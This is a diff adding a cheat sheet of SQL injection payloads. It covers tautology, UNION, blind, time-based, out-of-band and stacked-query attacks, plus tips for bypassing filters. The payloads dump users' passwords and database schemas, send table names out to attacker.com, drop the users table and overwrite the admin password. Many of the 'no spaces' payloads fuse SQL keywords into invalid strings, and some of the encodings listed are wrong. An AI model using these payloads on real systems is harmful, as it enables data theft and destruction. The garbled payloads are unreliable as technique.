@@ -1,1 +1,94 @@
+Basic SQL Injection Payloads (No Spaces)
+Tautology-Based Payloads:
 
+'OR1=1--
+'OR'a'='a
+'OR1=1#
+'OR1=1/*
+'OR'x'='x
+Single Quote for Syntax Testing:
+
+'
+'--
+"--
+"
+Comment-Based Payloads:
+
+';--
+'UNIONSELECTNULL,username,passwordFROMusers--
+'UNIONSELECT1,2,3--
+'UNIONSELECTNULL,database(),version()--
+Error-Based SQL Injection:
+
+'AND1=0--
+'AND1=2--
+'AND1=1--
+'AND1=1;--
+Union-Based SQL Injection (No Spaces)
+Basic UNION Injection:
+
+'UNIONSELECTNULL,NULL--
+'UNIONSELECT1,2,3--
+'UNIONSELECTusername,passwordFROMusers--
+'UNIONSELECTNULL,database(),version()--
+Extracting Database Version and Current Database Name:
+
+'UNIONSELECTNULL,database(),NULL--
+'UNIONSELECTNULL,version(),NULL--
+Blind SQL Injection (No Spaces)
+True/False Tests:
+
+'AND1=1--
+'AND1=2--
+Time-Based Blind SQLi:
+
+'ORIF(1=1,SLEEP(5),0)--
+'ORIF(1=1,BENCHMARK(1000000,MD5(1)),0)--
+Advanced SQL Injection Payloads (No Spaces)
+Retrieving Table Names:
+
+'UNIONSELECTNULL,table_name,NULLFROMinformation_schema.tables--
+'UNIONSELECTNULL,table_name,NULLFROMall_tables--
+Retrieving Column Names:
+
+'UNIONSELECTNULL,column_name,NULLFROMinformation_schema.columnsWHEREtable_name='users'--
+'UNIONSELECTNULL,column_name,NULLFROMall_tab_columnsWHEREtable_name='users'--
+Extracting Data (Username & Password):
+
+'UNIONSELECTNULL,username,passwordFROMusers--
+'UNIONSELECTusername,passwordFROMusers--
+'UNIONSELECTusername,password,emailFROMusers--
+Dumping the Entire Database:
+
+'UNIONSELECTNULL,group_concat(table_name),NULLFROMinformation_schema.tables--
+'UNIONSELECTNULL,group_concat(column_name),NULLFROMinformation_schema.columnsWHEREtable_name='users'--
+OOB (Out-of-Band) SQL Injection Payloads
+DNS Exfiltration:
+'OR1=1;SELECTload_file('\\\\attacker.com\\evil.txt')--
+'UNIONSELECTNULL,CONCAT('http://attacker.com/',table_name)FROMinformation_schema.tables--
+Bypassing Filters (Encoded)
+If filters are blocking some characters, you can encode them to bypass the filter:
+
+URL Encoding:
+
+%27 for '
+%22 for "
+%2D%2D for --
+Hexadecimal Encoding:
+
+0x27 for '
+0x2D for -
+0x2D for --
+Unicode Encoding:
+
+\u0027 for '
+\u002D\u002D for --
+Stacked Queries (Multiple Queries) without Spaces
+Basic Stacked Query:
+
+' ;DROP TABLE users--
+' ;SELECT * FROM sensitive_table--
+Inject Multiple Queries:
+
+' ;UPDATE users SET password='newpassword' WHERE username='admin'--
+' ;SELECT * FROM users WHERE username='admin' AND password='newpassword'--
